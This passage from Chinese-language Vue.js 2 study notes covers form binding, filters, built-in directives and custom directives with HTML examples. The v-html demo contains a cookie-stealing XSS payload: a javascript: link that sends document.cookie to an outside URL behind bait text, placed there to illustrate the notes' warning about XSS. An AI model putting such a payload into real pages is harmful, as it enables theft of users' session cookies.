                 <option value="wuhan">武汉</option>
             </select><br><br>
             其它信息：
             <textarea v-model.lazy="userInfo.other"></textarea><br><br>
             <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.baidu.com">《用户协议》</a><br><br>
             <button>提交（默认类型为submit）</button>
         </form>
     </div>
 </body>
     <script>
         const vm=new Vue({
             el:'#root',
             data:{
                 userInfo:{
                     account:'',
                 pwd:'',
                 gender:'female',
                 age:null ,
                 hobby:[],
                 city:'',
                 other:'',
                 agree:''
                 }
             },
             methods: {
                 demo(){
                     console.log(JSON.stringify(this.userInfo))
                 }
             },
         })
     </script>
 </html>
 ```

## 12、过滤器

过滤器：

定义：对要显示的数据继续宁特定格式化后再显示（适用于一些简单的处理）

注册过滤器：

1. 注册全局过滤器：`Vue.filter(name,callback)`  
2. 注册局部过滤器： `new Vue(filters:{})`

用法：

​		`{{xxx | 过滤器名}}` 或 `v-bind:属性="xxx | 过滤器名"`  （可以连串）`v-model不行`

备注：

1. 锅炉其也可以接收额外参数、多个过滤器也可以串联
2. 并没有改变原本的数据，是产生新的对应的数据。



```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"></script>
    <script src="../js/vue.js"></script>    
    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js"></script>
    
</head>
<body>
    <div id="root">
        <h3>时间戳：{{timestamp}}</h3>
        <h3>过滤后的时间：{{timestamp | timeFormater}}</h3>
        <h3>过滤后的时间（传参）：{{timestamp | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
        <h3 :x="msg | mySlice">全局</h3>
        <!-- 这下不能这么玩 -->
        <!-- <input type="text" v-model="msg | mySlice"> -->
    </div>

</body>
<script>
    Vue.filter('mySlice',function(value){
        return value.slice(0,4);
    });
    const vm=new Vue({
        el:'#root',
        data:{
            msg:'12345',
            timestamp:new Date().getTime(),
        },
        //这是实时动态时间的
        // methods:{
        //     getTime(){
        //         setInterval(() => {
        //             this.timestamp=new Date().getTime();
        //         }, 1000);
        //     }
        // },
        // created(){
        //     this.getTime();
        // },

        filters:{
            timeFormater(value,str='YYYY年MM月DD日HH:mm:ss'){
                return dayjs(value).format(str);
            }
        }
    })
</script>
</html>
```



## 13、内置指令

v-bind：单向数据绑定 

v-model：双向数据绑定

v-for：遍历数组、对象、字符串

v-on：绑定事件

v-if：条件渲染（动态控制节点是否存在）

v-else：条件渲染（动态控制节点是否存在）

v-show：条件渲染（动态控制节点是否展示）

==**v-text指令：**==

1. 作用：向其所在的节点中渲染文本内容。
2. 与插值语法的区别：v-text会替换掉节点中的内容。

==**v-html指令：**==

1. 作用：向指定节点中渲染包含html结构的内容
2. 与插值语法的区别：
   1. v-html会替换掉节点中所有的内容
   2. v-html可以识别html结构
   3. 注意：v-html有安全性问题！！！
      1. 再网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
      2. 一定要再可信的内容上使用v-html，永不要用再用户提交的内容上！

v-cloak指令（不接受参数）：

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
2. 使用css配合v-cloak可以解决网速慢时界面展示出{{xxx}}模板的问题。

v-once指令（不接受参数）：

1. v-once所在节点再初次动态渲染后，就视为静态内容了（只解析一次）
2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

v-pre指令：

1. 通过其所在的节点的编译过程。
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```html
    <style>
        /* [v-cloak]{
            display: none;
        } */
    </style>
</head>
<body>
    <div id="root">
        <!-- v-text -->
        <div v-text="name">这是什么</div>
        <!--v-html-->
        <div v-html="str">好啊</div>
        <!--v-cloak-->
        <div v-cloak >{{name}}</div>
        <!-- v-once -->
        <div v-once>n:{{n}}</div><br>
        <div>n:{{n}}</div>
        <button @click="n++">n+1</button>
        <!--v-pre-->
        <div v-pre>跳过简简单单</div>
    </div>
</body>
<script>
    $('[v-cloak]').css({"display":"none"})
    setTimeout(() => {
    const vm=new Vue({
        el:'#root',
        data:{
            name:'内置指令',
            n:0,
            str:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟快来，这里好多牛牛</a>'
        }
    })
    }, 3000);
    
    
</script>
```

## 14、自定义指令

一、定义语法：

1. 局部指令：
   1. `new Vue({directives:{指令名:配置对象}})` 或 `new Vue({directives(){}})`
2. 全局指令：
   1. `Vue.directive(指令名，配置对象)` 或 `Vue.directive(指令名，回调函数)`

二、配置对象中常用的3个回调（以及执行顺序）：

(1). bind：指令与元素成功绑定

(2). inserted：指令所在元素被插入页面时调用。

(3). update：指令所在模板结构被重新解析时调用。

三、备注：

(1).指令定义时不加v-，但使用时要加v-；

(2).指令名如果时多个单词，要使用kebab-case命名方式，不要用camelCase命名。

实例解决需求：

需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。

需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点

```html
<body>
    <div id="root">
        <!-- 需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。 -->
        <h2>{{name}}</h2><br>
        <h2>当前的n值是：{{n}}</h2><br>
        <h2>放大10倍后的n值是：<span v-big="n"></span></h2><br>
        <button @click="n++">点我n+1</button><br>
        <input type="text"  v-fbind:value="n"><br>
        <input type="text"><br>
    </div>
</body>
<script>
    //全局指令
    Vue.directive('fbind', {
        bind(el, binding, vnode) {
            console.log('bind');
            el.value=binding.value;
        },
        inserted(el, binding, vnode) {
            console.log('inserted');

        },
        update(el, binding, vnode, oldVnode) {
            console.log('update');
            el.value=binding.value;
            el.focus();
        },
        componentUpdated(el, binding, vnode) {
            console.log('componentUpdated');
        },
        unbind(el, binding, vnode) {
            console.log('unbind');
        },
    });
    const vm=new Vue({
        el:'#root',
        data:{
            name:'自定义指令',
            n:0,
        },
        //局部、简写（包含bind、update 回调函数）
        directives:{
            //big函数何时会被调用？1、指令与元素成功绑定时。2、指令所在的模板被重新解析时。
            big(element,bindInterface,VNode){
                console.log(VNode)
                element.innerText=bindInterface.value*10;
            },
            // fbind:{
            //     bind(element,bindInterface){
            //         console.log('bind')
            //         element.value=bindInterface.value;
            //     },
            //     inserted(element,bindInterface){
            //         console.log('inserted')
            //     },
            //     update(element,bindInterface){
            //         console.log('update');
            //         element.value=bindInterface.value;
            //         element.focus();
            //     }
            // }
            
        }
    })
</script>
```













